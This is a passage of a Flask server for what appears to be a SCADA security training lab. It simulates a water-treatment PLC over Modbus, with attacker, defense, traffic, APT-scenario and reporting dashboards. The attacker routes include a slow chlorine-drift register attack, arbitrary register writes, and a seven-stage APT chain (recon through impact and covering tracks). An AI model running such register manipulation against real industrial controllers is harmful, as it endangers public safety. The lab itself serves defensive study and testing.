                new_speed = max(0, 80 - i*3)
                r1 = c.write_register(0, new_cl)
                r2 = c.write_register(2, new_speed)
                # Check if firewall started blocking (isError means exception response)
                if hasattr(r1, 'isError') and r1.isError() and blocked_at is None:
                    blocked_at = i+1
                    push_narrative("firewall", "◈", "FIREWALL",
                                   f"VAL-007 BLOCKED — Cl drift exceeded 60 units at step {blocked_at}")
                if i == 0 or (i+1) % 5 == 0:
                    push_narrative("attack", "►", "ATTACK",
                                   f"Step {i+1}/{steps} — Cl={new_cl}, Speed={new_speed}")
                if new_cl > 800 and i % 5 == 0:
                    push_narrative("sis", "⚠", "SIS",
                                   f"Cl={new_cl} > hard limit 700 — cumulative drift detected")
                time.sleep(2)
            c.close()
            push_narrative("cm", "✔", "CM-6", f"RoC anomaly: Cl drifted {steps*10} units over {steps*2}s")
            log_attack("Slow Drift", d, f"Drifted over {steps*2}s")
        except Exception as e:
            push_narrative("attack", "✖", "ERROR", f"slow_drift thread error: {e}")
            log_attack("Slow Drift ERROR", d, str(e))
    push_narrative("attack", "►", "ATTACK", f"Logic inject — slow drift thread launching [{steps} steps]")
    threading.Thread(target=drift, daemon=True).start()
    msg = f"Slow drift started — {steps} steps over ~{steps*2}s"
    log_attack("Slow Drift (started)", d, msg)
    verdict = "unknown"  # will be determined by firewall mid-attack
    return jsonify({"ok": True, "msg": msg, "verdict": verdict})

@app.route("/attacker/attack/write_register", methods=["POST"])
def attack_write_register():
    d = request.json or {}
    reg, val = int(d.get("reg",0)), int(d.get("value",0))
    try:
        c = get_client()
        c.write_register(reg, val)
        c.close()
        msg = f"HR{reg} ({REG_NAMES[reg]}) = {val}"
        log_attack("Write Register", d, msg)
        return jsonify({"ok": True, "msg": msg})
    except Exception as e:
        return jsonify({"ok": False, "msg": str(e)}), 500

@app.route("/attacker/attack/reset", methods=["POST"])
def attack_reset():
    try:
        push_narrative("cm",  "✔", "CM-6", "Restoring safe state — writing nominal values")
        push_narrative("plc", "►", "PLC",  "Writing coils 0–11 → OFF, then System_Enable → ON")
        push_narrative("plc", "►", "PLC",  "Writing HR0=200, HR1=300, HR2=50, HR3=50")
        c = get_client()
        c.write_coils(0, [False]*12)
        c.write_registers(0, [200, 300, 50, 50])
        c.write_coil(11, True)
        c.close()
        msg = "PLC reset: safe state restored"
        push_narrative("plc",  "✔", "PLC",  "Safe state confirmed — Cl=200, Coag=300, Speed=50, Level=50")
        push_narrative("sis",  "✔", "SIS",  "All parameters within safe bands — SIS armed and watching")
        log_attack("RESET", {}, msg)
        return jsonify({"ok": True, "msg": msg})
    except Exception as e:
        push_narrative("attack", "✖", "ERROR", f"reset failed: {e}")
        return jsonify({"ok": False, "msg": str(e)}), 500

# ════════════════════════════════════════════════════════════════
# ROUTES — DEFENSE DASHBOARD
# ════════════════════════════════════════════════════════════════

# Defense mode state
_defense_mode = {"active": False, "firewall_thread": None, "cm_thread": None, "dry_run": False}

@app.route("/defense")
def defense_dashboard():
    return render_template("defense.html",
                           coil_names=COIL_NAMES, reg_names=REG_NAMES,
                           reg_safe=REG_SAFE, reg_max=REG_MAX,
                           defense_available=DEFENSE_AVAILABLE)

@app.route("/defense/stream")
def defense_stream():
    return sse_stream(hmi_clients)

@app.route("/defense/status")
def defense_status():
    status = {
        "defense_available": DEFENSE_AVAILABLE,
        "defense_active": _defense_mode["active"],
        "dry_run": _defense_mode["dry_run"],
        "plc_connected": plc_state["connected"],
        "ts": plc_state["ts"],
        "coils": plc_state["coils"],
        "regs": plc_state["regs"],
        "alarms": alarm_log[-20:],
        "anomalies": anomaly_log[-10:],
    }
    if DEFENSE_AVAILABLE and _defense_mode["active"]:
        try:
            status["firewall"] = fw_stats()
            status["countermeasures"] = get_cm_summary()
            status["cm_log"] = get_cm_log()[-30:]
        except Exception as e:
            status["defense_error"] = str(e)
    return jsonify(status)

@app.route("/defense/firewall/health")
def defense_firewall_health():
    """BUG1 FIX: Real liveness check — tries to connect to the firewall TCP port.
    Returns {alive: true/false} so the dashboard pill reflects actual state.
    """
    import socket as _sock
    try:
        s = _sock.create_connection(("127.0.0.1", 5502), timeout=1)
        s.close()
        return jsonify({"alive": True})
    except Exception:
        return jsonify({"alive": False})

@app.route("/defense/firewall/stats")
def defense_fw_stats():
    if not DEFENSE_AVAILABLE:
        return jsonify({"error": "Defense modules not loaded"}), 503
    return jsonify(fw_stats())

@app.route("/defense/cm_log")
def defense_cm_log():
    if not DEFENSE_AVAILABLE:
        return jsonify([])
    return jsonify(get_cm_log()[-50:])

@app.route("/defense/rules")
def defense_rules():
    if not DEFENSE_AVAILABLE:
        return jsonify({"error": "Defense modules not loaded"}), 503
    return jsonify({
        "firewall_rules": FW_RULES,
        "countermeasures": CMS,
    })

@app.route("/defense/enable", methods=["POST"])
def defense_enable():
    d = request.json or {}
    dry_run = bool(d.get("dry_run", False))
    if not DEFENSE_AVAILABLE:
        return jsonify({"ok": False, "msg": "Defense modules not available"}), 503
    if _defense_mode["active"]:
        return jsonify({"ok": True, "msg": "Defense already active"})

    _defense_mode["active"] = True
    _defense_mode["dry_run"] = dry_run

    # Start countermeasure engine in background thread
    cm_t = threading.Thread(
        target=run_countermeasures,
        kwargs={"dry_run": dry_run, "poll": 1.0},
        daemon=True
    )
    cm_t.start()
    _defense_mode["cm_thread"] = cm_t

    # Start firewall in background thread
    fw_t = threading.Thread(target=run_firewall, daemon=True)
    fw_t.start()
    _defense_mode["firewall_thread"] = fw_t

    mode_str = "DRY RUN (detect only)" if dry_run else "ACTIVE (blocking + auto-response)"
    ts = datetime.now().strftime("%H:%M:%S")
    with lock:
        alarm_log.append({"ts": ts, "level": "INFO",
                          "msg": f"[DEFENSE] Layer activated — {mode_str}"})
    return jsonify({"ok": True, "msg": f"Defense layer started — {mode_str}"})

@app.route("/defense/disable", methods=["POST"])
def defense_disable():
    _defense_mode["active"] = False
    ts = datetime.now().strftime("%H:%M:%S")
    with lock:
        alarm_log.append({"ts": ts, "level": "WARNING",
                          "msg": "[DEFENSE] Defense layer DISABLED"})
    return jsonify({"ok": True, "msg": "Defense layer disabled (threads will wind down)"})

@app.route("/defense/test_block", methods=["POST"])
def defense_test_block():
    """Test endpoint: fires a simulated blocked-attack entry for demo purposes."""
    d = request.json or {}
    rule = d.get("rule", "VAL-001")
    ts = datetime.now().strftime("%H:%M:%S")
    test_event = {
        "ts": ts, "action": "BLOCK",
        "rule_id": rule, "rule_name": "Demo Block",
        "src_ip": "127.0.0.1", "fc": "WRITE_REG",
        "detail": "Test block event generated for demo",
        "severity": "HIGH", "mitre": "T0831",
    }
    return jsonify({"ok": True, "event": test_event})

# ════════════════════════════════════════════════════════════════
# ROUTES — NETWORK TRAFFIC PANEL
# ════════════════════════════════════════════════════════════════

@app.route("/traffic")
def traffic_dashboard():
    return render_template("traffic.html",
                           coil_names=COIL_NAMES, reg_names=REG_NAMES)

@app.route("/traffic/packets")
def traffic_packets():
    if not DEFENSE_AVAILABLE:
        return jsonify([])
    limit   = int(request.args.get("limit", 100))
    verdict = request.args.get("verdict") or None
    fc      = request.args.get("fc") or None
    ip      = request.args.get("ip") or None
    return jsonify(_cap.get_packets(limit=limit, verdict_filter=verdict,
                                    fc_filter=fc, ip_filter=ip))

@app.route("/traffic/packet/<int:seq>")
def traffic_packet_detail(seq):
    if not DEFENSE_AVAILABLE:
        return jsonify({"error": "capture unavailable"}), 503
    pkt = _cap.get_packet_by_seq(seq)
    if not pkt:
        return jsonify({"error": "not found"}), 404
    return jsonify(pkt)

@app.route("/traffic/stats")
def traffic_stats():
    if not DEFENSE_AVAILABLE:
        return jsonify({"error": "capture unavailable"}), 503
    return jsonify(_cap.get_stats())

@app.route("/traffic/clear", methods=["POST"])
def traffic_clear():
    if DEFENSE_AVAILABLE:
        _cap.clear()
    return jsonify({"ok": True})

# ════════════════════════════════════════════════════════════════
# ROUTES — APT SCENARIO DASHBOARD
# ════════════════════════════════════════════════════════════════

# APT state
_apt_state = {
    "running": False,
    "current_stage": 0,
    "stages_done": [],
    "stage_log": [],      # flat list of log lines for UI
    "session": None,
    "thread": None,
    "events": [],
    "start_ts": None,
}
_apt_lock = threading.Lock()

def _apt_log(msg: str, color: str = "text"):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    with _apt_lock:
        _apt_state["stage_log"].append({"ts": ts, "msg": msg, "color": color})
        if len(_apt_state["stage_log"]) > 500:
            _apt_state["stage_log"].pop(0)

def _run_apt_chain(ip, port, stages, auto=True):
    """Run APT stages in a background thread, streaming log to dashboard."""
    import sys as _sys
    _apt_state["running"] = True
    _apt_state["start_ts"] = datetime.now().isoformat()
    _apt_state["stages_done"] = []
    _apt_state["stage_log"] = []
    _apt_state["events"] = []

    try:
        from pymodbus.client import ModbusTcpClient as _MC
        import attacker.apt_scenario as _apt

        # Reset session
        _apt._session.update({
            "session_id": f"APT-{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            "started_at": datetime.now().isoformat(),
            "target": ip, "port": port,
            "completed": False, "stages": [],
            "total_packets": 0, "total_bytes": 0,
            "mitre_techniques": [],
            "plc_state_initial": {}, "plc_state_final": {},
        })
        _apt._stage_events.clear()

        _apt_log("APT chain starting…", "cyan")
        client = _MC(ip, port=port)
        if not client.connect():
            _apt_log(f"Connection failed to {ip}:{port}", "red")
            return

        _apt_log(f"Connected to {ip}:{port}", "green")
        _apt._session["plc_state_initial"] = _apt.snapshot(client)

        stage_fns = {
            1: lambda: _apt.stage1_recon(client),
            2: lambda: _apt.stage2_initial_access(client),
            3: lambda: _apt.stage3_discovery(client),
            4: lambda: _apt.stage4_credential_bypass(client, ip, 502),
            5: lambda: _apt.stage5_lateral(client),
            6: lambda: _apt.stage6_impact(client),
            7: lambda: _apt.stage7_cover_tracks(client),
        }

        STAGE_COLORS = {1:"cyan",2:"yellow",3:"blue",4:"purple",5:"yellow",6:"red",7:"muted"}
        STAGE_MITRES = {1:"T0840",2:"T0855",3:"T0888",4:"T0865",5:"T0886",6:"T0831+T0803+T0836",7:"T0851"}

        for num in stages:
            if not _apt_state["running"]:
                break
            _apt_state["current_stage"] = num
            stage_info = _apt.STAGES.get(num, {})
            _apt_log(f"━━━ Stage {num}/7 — {stage_info.get('name','?')} [{STAGE_MITRES.get(num,'')}] ━━━",
                     STAGE_COLORS.get(num,"text"))

            try:
                result = stage_fns[num]()
                _apt._session["stages"].append(result)
                _apt._session["total_packets"] += result.get("packets", 0)
                _apt_state["stages_done"].append(num)
                _apt_log(f"Stage {num} complete — {result.get('packets',0)} packets", "green")

                # Copy sub-stage details as log lines
                for sub_k, sub_v in result.get("sub_stages", {}).items():
                    _apt_log(f"  {sub_k}: {sub_v.get('effect','')}", "muted")

            except Exception as e:
                _apt_log(f"Stage {num} error: {e}", "red")

            if auto and num < max(stages):
                time.sleep(1.5)

        _apt._session["plc_state_final"] = _apt.snapshot(client)
        _apt._session["completed"] = True
        _apt._session["mitre_techniques"] = list({e["mitre"] for e in _apt._stage_events})

        client.close()

        # Save log file
        ts_file = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = os.path.join(os.path.dirname(__file__), f"../apt_log_{ts_file}.json")
        with open(out_path, "w") as f:
            json.dump({"session": _apt._session, "events": _apt._stage_events},
                      f, indent=2, default=str)

        with _apt_lock:
            _apt_state["session"] = _apt._session
            _apt_state["events"]  = list(_apt._stage_events)

        _apt_log(f"APT chain complete. {_apt._session['total_packets']} total packets.", "green")
        _apt_log(f"Session log saved: apt_log_{ts_file}.json", "muted")

    except Exception as e:
        _apt_log(f"Fatal error: {e}", "red")
    finally:
        _apt_state["running"] = False
        _apt_state["current_stage"] = 0

@app.route("/apt")
def apt_dashboard():
    return render_template("apt.html", coil_names=COIL_NAMES, reg_names=REG_NAMES)

@app.route("/apt/status")
def apt_status():
    with _apt_lock:
        return jsonify({
            "running":        _apt_state["running"],
            "current_stage":  _apt_state["current_stage"],
            "stages_done":    _apt_state["stages_done"],
            "stage_log":      _apt_state["stage_log"][-80:],
            "total_packets":  _apt_state["session"]["total_packets"] if _apt_state["session"] else 0,
            "mitre":          _apt_state["session"]["mitre_techniques"] if _apt_state["session"] else [],
            "start_ts":       _apt_state["start_ts"],
        })

@app.route("/apt/start", methods=["POST"])
def apt_start():
    if _apt_state["running"]:
        return jsonify({"ok": False, "msg": "APT chain already running"})
    d = request.json or {}
    ip     = d.get("ip", "127.0.0.1")
    port   = int(d.get("port", 5502))
    stages = d.get("stages", list(range(1, 8)))
    auto   = bool(d.get("auto", True))
    t = threading.Thread(
        target=_run_apt_chain,
        args=(ip, port, stages, auto),
        daemon=True
    )
    t.start()
    _apt_state["thread"] = t
    return jsonify({"ok": True, "msg": f"APT chain started — {len(stages)} stages"})

@app.route("/apt/stop", methods=["POST"])
def apt_stop():
    _apt_state["running"] = False
    return jsonify({"ok": True, "msg": "Stop signal sent"})

@app.route("/apt/events")
def apt_events():
    with _apt_lock:
        return jsonify(_apt_state.get("events", []))

@app.route("/apt/session")
def apt_session():
    with _apt_lock:
        if not _apt_state["session"]:
            return jsonify({"error": "No completed session yet"})
        return jsonify(_apt_state["session"])

@app.route("/apt/logs")
def apt_logs():
    """List available apt_log_*.json files."""
    base = os.path.dirname(__file__)
    logs = sorted(
        [f for f in os.listdir(base + "/..") if f.startswith("apt_log_") and f.endswith(".json")],
        reverse=True
    )
    return jsonify(logs[:10])

# ── Hardware state endpoint (for ESP32 / future hardware) ─────────────────────
@app.route("/hardware/state")
def hardware_state():
    with lock:
        return jsonify({
            "ts": plc_state["ts"],
            "coils": {COIL_NAMES[i]: plc_state["coils"][i] for i in range(12)},
            "registers": {REG_NAMES[i]: plc_state["regs"][i] for i in range(4)},
            "alarm_active": plc_state["coils"][10] if plc_state["coils"] else False,
            "system_enable": plc_state["coils"][11] if plc_state["coils"] else False,
            "chlorine_safe": plc_state["regs"][0] <= 800 if plc_state["regs"] else True,
        })

# ════════════════════════════════════════════════════════════════
# ROUTES — REPORTING ENGINE
# ════════════════════════════════════════════════════════════════

try:
    from reporting.report_engine import generate as _gen_report, collect_data, build_report
    REPORTING_AVAILABLE = True
except ImportError as _re:
    REPORTING_AVAILABLE = False
    print(f"[!] Reporting module not loaded: {_re}")

_report_state = {"generating": False, "last": None, "history": []}
_report_lock  = threading.Lock()

@app.route("/report")
def report_dashboard():
    return render_template("report.html", coil_names=COIL_NAMES, reg_names=REG_NAMES)

@app.route("/report/generate", methods=["POST"])
def report_generate():
    if not REPORTING_AVAILABLE:
        return jsonify({"ok": False, "msg": "Reporting module unavailable"}), 503
    if _report_state["generating"]:
        return jsonify({"ok": False, "msg": "Report already generating"})
    d       = request.json or {}
    apt_log = d.get("apt_log") or None
    out_dir = os.path.join(os.path.dirname(__file__), "../reports")
    def _gen():
        _report_state["generating"] = True
        try:
            result = _gen_report(apt_log_path=apt_log, out_dir=out_dir)
            with _report_lock:
                _report_state["last"] = result
                _report_state["history"].append({
                    "ts":        datetime.now().strftime("%H:%M:%S"),
                    "report_id": result["report"].get("report_id","?"),
                    "severity":  result["report"].get("severity","?"),
                    "json":      os.path.basename(result["json"]),
                    "html":      os.path.basename(result["html"]),
                    "pdf":       os.path.basename(result["pdf"]) if result["pdf"] else None,
                })
        except Exception as e:
            print(f"[Report] Error: {e}")
        finally:
            _report_state["generating"] = False
    threading.Thread(target=_gen, daemon=True).start()
    return jsonify({"ok": True, "msg": "Report generation started"})

@app.route("/report/status")
def report_status():
    with _report_lock:
        last = _report_state["last"]
        return jsonify({
            "generating":          _report_state["generating"],
            "reporting_available": REPORTING_AVAILABLE,
            "history":             _report_state["history"][-10:],
            "last_report_id":      last["report"]["report_id"] if last else None,
            "last_severity":       last["report"]["severity"]  if last else None,
        })

@app.route("/report/preview")
def report_preview():
    with _report_lock:
        last = _report_state["last"]
    if last:
        return jsonify(last["report"])
    if not REPORTING_AVAILABLE:
        return jsonify({"error": "Reporting unavailable"}), 503
    data   = collect_data()
    report = build_report(data)
    return jsonify(report)

@app.route("/report/download/<filename>")
def report_download(filename):
    base = os.path.join(os.path.dirname(__file__), "../reports")
    path = os.path.join(base, filename)
    if not os.path.exists(path) or ".." in filename:
        return "Not found", 404
    mime = {".html":"text/html",".pdf":"application/pdf",
            ".json":"application/json"}.get(os.path.splitext(filename)[1], "application/octet-stream")
    with open(path, "rb") as f:
        content = f.read()
    from flask import Response as _Resp
    return _Resp(content, mimetype=mime,
                 headers={"Content-Disposition": f'attachment; filename="{filename}"'})

@app.route("/report/list")
def report_list():
    base = os.path.join(os.path.dirname(__file__), "../reports")
    if not os.path.exists(base):
        return jsonify([])
    files = sorted([f for f in os.listdir(base) if f.startswith("incident_report_")], reverse=True)
    result = []
    for f in files[:20]:
        size = os.path.getsize(os.path.join(base, f))
        result.append({"filename": f, "ext": os.path.splitext(f)[1],
                        "size_human": f"{size//1024}KB" if size > 1024 else f"{size}B"})
    return jsonify(result)

# ── Start ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    # Start the Modbus polling thread (shared across all dashboard views)
    threading.Thread(target=poll_plc, daemon=True).start()

    # Install the packet_capture hook so live Modbus traffic is pushed to the
    # dashboard traffic SSE stream (/dashboard/traffic) in real time.
    install_traffic_hook()

    print("""
  ╔══════════════════════════════════════════════════════════════╗
  ║         CPSS SCADA Dashboard Server  (Phases 1–5)           ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Unified SCADA Terminal →  http://localhost:5000/dashboard  ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  START ORDER (for full traffic capture):                    ║
  ║    1. OpenPLC Runtime       → :502                          ║
  ║    2. python3 defense/modbus_firewall.py  → :5502           ║
  ║    3. python3 dashboard/server.py         → :5000           ║
  ║                                                             ║
  ║  Without firewall: dashboard falls back to direct :502      ║
  ║  (attacks work but traffic table stays empty)               ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Legacy pages:                                              ║
  ║  Attacker Console →  http://localhost:5000/attacker         ║
  ║  Defense Layer    →  http://localhost:5000/defense          ║
  ║  Traffic Panel    →  http://localhost:5000/traffic          ║
  ╚══════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)